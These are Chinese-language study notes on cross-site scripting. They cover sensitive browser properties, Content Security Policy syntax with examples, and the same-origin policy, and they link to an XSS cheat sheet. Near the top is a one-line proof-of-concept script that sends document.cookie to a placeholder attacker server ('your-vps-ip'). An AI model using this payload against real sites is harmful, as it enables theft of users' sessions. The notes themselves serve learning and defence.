# XSS

## 基本思路

xss的目的在于前端网页中注入恶意js代码，使得攻击者可以利用访问该网页用户的身份进行恶意操作

可以利用的敏感信息

```
document.cookie
document.location.href
top.location.href
window.opener.location.href
...
```

最简单的poc
```js
<script>window.open("http://your-vps-ip/"+document.cookie)</script>
```
window.open 可以替换为 window.location.href

## iframe


## 图片
### PNG

参考链接 https://xz.aliyun.com/t/7530

## CSP相关

>CSP 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。
>CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。
>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

简单的来说CSP就是浏览器在加载网页内外联的其他资源``js,css,img``等，会检测来源是不是来自可信的域，有效避免恶意插入到网页中的xss被执行

CSP策略通过服务端发送的``Content-Security-Policy`` HTTP头来指定

通过下面的几个示例能够快速理解csp的语法规则

示例 1
一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名)

```
Content-Security-Policy: default-src 'self'
```

示例 2
一个网站管理者允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)

```
Content-Security-Policy: default-src 'self' *.trusted.com
```

示例 3
一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码.

```
Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
```

在这里，各种内容默认仅允许从文档所在的源获取, 但存在如下例外:

图片可以从任何地方加载(注意 "*" 通配符)。
多媒体文件仅允许从 media1.com 和 media2.com 加载(不允许从这些站点的子域名)。
可运行脚本仅允许来自于userscripts.example.com。

示例 4
一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。

```
Content-Security-Policy: default-src https://onlinebanking.jumbobank.com
```

该服务器仅允许通过HTTPS方式并仅从onlinebanking.jumbobank.com域名来访问文档。

示例 5
一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容(从任意位置加载)。

```
Content-Security-Policy: default-src 'self' *.mailsite.com; img-src *
```

### 同源策略

如果两个 URL 的 protocol、port (如果有指定的话)和 host 都相同的话，则这两个 URL 是同源。这个方案也被称为“协议/主机/端口元组”，或者直接是 “元组”。（“元组” 是指一组项目构成的整体，双重/三重/四重/五重/等的通用形式）。


## CheatSheet

Cross-site scripting (XSS) cheat sheet：

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet